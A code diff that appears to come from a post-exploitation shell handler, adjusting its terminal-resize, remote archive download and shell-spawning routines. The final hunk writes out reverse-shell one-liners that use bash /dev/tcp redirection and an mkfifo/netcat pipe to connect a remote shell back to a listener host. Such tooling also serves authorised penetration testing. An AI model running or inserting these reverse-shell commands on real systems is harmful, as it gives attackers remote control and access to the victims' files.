@@ -2669,7 +2669,7 @@ class Session:
 					response = self.control_session.exec(**args)
 					return response
 				except AttributeError: # No control session
-					logger.error("Spawn a new shell for this session to operate properly")
+					logger.error("Spawn MANUALLY a new shell for this session to operate properly")
 					return None
 
 			if not self or not self.subchannel.can_use:
@@ -3013,7 +3013,7 @@ class Session:
 			else: # TODO
 				threading.Thread(
 					target=self.exec,
-					args=(f"stty rows {lines} columns {columns} -F {self.tty}",),
+					args=(f"stty rows {lines} columns {columns} < {self.tty}",),
 					name="RESIZE"
 				).start() #TEMP
 		elif self.OS == 'Windows': # TODO
@@ -3242,16 +3242,17 @@ class Session:
 
 				tar_source, mode = stdout_stream, "r|gz"
 			else:
+				remote_items = ' '.join([os.path.join(self.cwd, part) for part in shlex.split(remote_items)])
 				temp = self.tmp + "/" + rand(8)
-				cmd = rf'tar -czf - -h {remote_items}|base64 > {temp}'
+				cmd = rf'tar -czf - -h {remote_items}|base64|tr -d "\n" > {temp}'
 				response = self.exec(cmd, timeout=None, value=True)
-				if not response:
+				if response is False:
 					logger.error("Cannot create archive")
 					return []
 				errors = [line[5:] for line in response.splitlines() if line.startswith('tar: /')]
 				for error in errors:
 					logger.error(error)
-				send_size = int(self.exec(rf"stat {temp} | sed -n 's/.*Size: \([0-9]*\).*/\1/p'"))
+				send_size = int(self.exec(rf"(stat -x {temp} 2>/dev/null || stat {temp}) | sed -n 's/.*Size: \([0-9]*\).*/\1/p'"))
 
 				b64data = io.BytesIO()
 				for offset in range(0, send_size, options.download_chunk_size):
@@ -3725,9 +3726,9 @@ class Session:
 					new_listener = TCPListener(host, port)
 
 				if self.bin['bash']:
-					cmd = f'printf "{self.bin["setsid"]} {self.bin["bash"]} >& /dev/tcp/{host}/{port} 0>&1 &"|{self.bin["bash"]}'
-				elif self.bin['nc']:
-					cmd = f'sh -c \'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | {self.bin["sh"]} 2>&1 | nc {host} {port} > /tmp/f &\''
+					cmd = f'printf "(bash >& /dev/tcp/{host}/{port} 0>&1) &"|bash'
+				elif self.bin['nc'] and self.bin['sh']:
+					cmd = f'printf "(rm /tmp/_;mkfifo /tmp/_;cat /tmp/_|sh 2>&1|nc {host} {port} >/tmp/_) &"|sh'
 				elif self.bin['sh']:
 					ncat_cmd = f'{self.bin["sh"]} -c "{self.bin["setsid"]} {{}} -e {self.bin["sh"]} {host} {port} &"'
 					ncat_binary = self.tmp + '/ncat'
